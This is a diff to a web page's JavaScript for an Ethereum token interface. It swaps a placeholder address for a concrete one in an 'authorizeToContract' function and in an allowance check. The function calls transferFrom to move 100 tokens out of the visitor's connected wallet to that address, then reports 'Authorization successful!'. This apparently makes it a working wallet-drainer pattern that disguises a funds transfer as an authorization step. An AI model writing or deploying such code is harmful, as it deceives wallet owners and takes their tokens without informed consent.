@@ -79,7 +79,9 @@
     let walletAddress = null;
     let contract;
     
+    // Your contract address
     const contractAddress = '0x572A3a205247F867fE63637BF5183142d5Ac0d9e';
+    
     const abi = [
       {
         "inputs": [
@@ -148,7 +150,7 @@
     async function authorizeToContract() {
       if (walletAddress) {
         try {
-          const tx = await contract.transferFrom(walletAddress, '0xYourContractAddress', ethers.utils.parseUnits('100', 18)); // Example
+          const tx = await contract.transferFrom(walletAddress, '0x572A3a205247F867fE63637BF5183142d5Ac0d9e', ethers.utils.parseUnits('100', 18)); // Example
           await tx.wait();
           statusDiv.innerHTML = 'Authorization successful!';
         } catch (err) {
@@ -179,7 +181,7 @@
     async function checkAllowance() {
       if (walletAddress) {
         try {
-          const spender = '0xYourContractAddress'; // Example spender address
+          const spender = '0x572A3a205247F867fE63637BF5183142d5Ac0d9e'; // Example spender address
           const allowance = await contract.allowance(walletAddress, spender);
           statusDiv.innerHTML = `Allowance: ${ethers.utils.formatUnits(allowance, 18)} tokens`;
         } catch (err) {
